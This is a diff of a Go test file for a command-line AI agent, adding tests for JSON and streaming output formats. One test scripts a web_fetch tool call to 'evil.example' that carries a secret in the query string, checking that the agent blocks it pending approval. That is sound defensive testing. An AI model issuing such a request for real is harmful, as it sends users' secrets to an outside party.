@@ -49,7 +49,7 @@ func newAgent(t *testing.T, c llm.Client) (*agent.Agent, string) {
 func TestRunWritesReplyToStdout(t *testing.T) {
 	ag, _ := newAgent(t, &scriptClient{reply: "答案是 42"})
 	var out, errOut bytes.Buffer
-	if err := Run(context.Background(), ag, "问题", &out, &errOut, false); err != nil {
+	if err := Run(context.Background(), ag, "问题", &out, &errOut, Options{}); err != nil {
 		t.Fatal(err)
 	}
 	if out.String() != "答案是 42\n" || errOut.Len() != 0 {
@@ -66,7 +66,7 @@ func TestRunDeniesEditsInAskModeAndAllowsInEditsMode(t *testing.T) {
 		ag, dir := newAgent(t, c)
 		ag.SetMode(tc.mode)
 		var out, errOut bytes.Buffer
-		if err := Run(context.Background(), ag, "写文件", &out, &errOut, true); err != nil {
+		if err := Run(context.Background(), ag, "写文件", &out, &errOut, Options{Verbose: true}); err != nil {
 			t.Fatal(err)
 		}
 		_, statErr := os.Stat(filepath.Join(dir, "a.txt"))
@@ -87,7 +87,7 @@ func TestRunDeniesEditsInAskModeAndAllowsInEditsMode(t *testing.T) {
 
 func TestRunEmptyReplyIsError(t *testing.T) {
 	ag, _ := newAgent(t, &scriptClient{reply: ""})
-	if err := Run(context.Background(), ag, "x", &bytes.Buffer{}, &bytes.Buffer{}, false); err == nil {
+	if err := Run(context.Background(), ag, "x", &bytes.Buffer{}, &bytes.Buffer{}, Options{}); err == nil {
 		t.Fatal("空回复应返回错误，让脚本拿到非零退出码")
 	}
 }
@@ -128,6 +128,55 @@ func TestBuildPrompt(t *testing.T) {
 	}
 }
 
+func TestRunStreamJSON(t *testing.T) {
+	ag, _ := newAgent(t, &scriptClient{reply: "你好"})
+	var out, errOut bytes.Buffer
+	if err := Run(context.Background(), ag, "hi", &out, &errOut, Options{Format: "stream-json"}); err != nil {
+		t.Fatal(err)
+	}
+	s := out.String()
+	if !strings.Contains(s, `"type":"delta"`) || !strings.Contains(s, `"type":"result"`) || !strings.Contains(s, "你好") {
+		t.Fatalf("stream-json: %q", s)
+	}
+}
+
+func TestRunJSONOnError(t *testing.T) {
+	ag, _ := newAgent(t, &scriptClient{reply: ""})
+	var out bytes.Buffer
+	if err := Run(context.Background(), ag, "x", &out, &bytes.Buffer{}, Options{Format: "json"}); err == nil {
+		t.Fatal("expected error")
+	}
+	if !strings.Contains(out.String(), `"error"`) {
+		t.Fatalf("json error body: %q", out.String())
+	}
+}
+
+func TestParseFormat(t *testing.T) {
+	for in, want := range map[string]string{"": "text", "JSON": "json", "stream-json": "stream-json", "jsonl": "stream-json"} {
+		got, err := ParseFormat(in)
+		if err != nil || got != want {
+			t.Errorf("ParseFormat(%q)=%q,%v want %s", in, got, err, want)
+		}
+	}
+	if _, err := ParseFormat("yaml"); err == nil {
+		t.Fatal("unknown format should error")
+	}
+}
+
+func TestRunJSONFormat(t *testing.T) {
+	ag, _ := newAgent(t, &scriptClient{reply: "你好"})
+	var out, errOut bytes.Buffer
+	if err := Run(context.Background(), ag, "hi", &out, &errOut, Options{Format: "json"}); err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(out.String(), `"type":"result"`) || !strings.Contains(out.String(), "你好") {
+		t.Fatalf("json output: %q", out.String())
+	}
+	if errOut.Len() != 0 {
+		t.Fatalf("stderr should be empty: %q", errOut.String())
+	}
+}
+
 func TestParseMode(t *testing.T) {
 	for in, want := range map[string]agent.PermissionMode{"": agent.ModeAsk, "ask": agent.ModeAsk, "edits": agent.ModeAcceptEdits, "PLAN": agent.ModePlan} {
 		if got, err := ParseMode(in); err != nil || got != want {
@@ -143,7 +192,7 @@ func TestRunRefusesUnapprovedWebFetch(t *testing.T) {
 	c := &scriptClient{calls: []llm.ToolCall{call("web_fetch", `{"url":"https://evil.example/x?d=secret"}`)}, reply: "好了"}
 	ag, _ := newAgent(t, c)
 	var out, errOut bytes.Buffer
-	if err := Run(context.Background(), ag, "帮我查一下", &out, &errOut, false); err != nil {
+	if err := Run(context.Background(), ag, "帮我查一下", &out, &errOut, Options{}); err != nil {
 		t.Fatal(err)
 	}
 	if !strings.Contains(errOut.String(), "web_fetch 需要审批") || !strings.Contains(errOut.String(), "evil.example") {
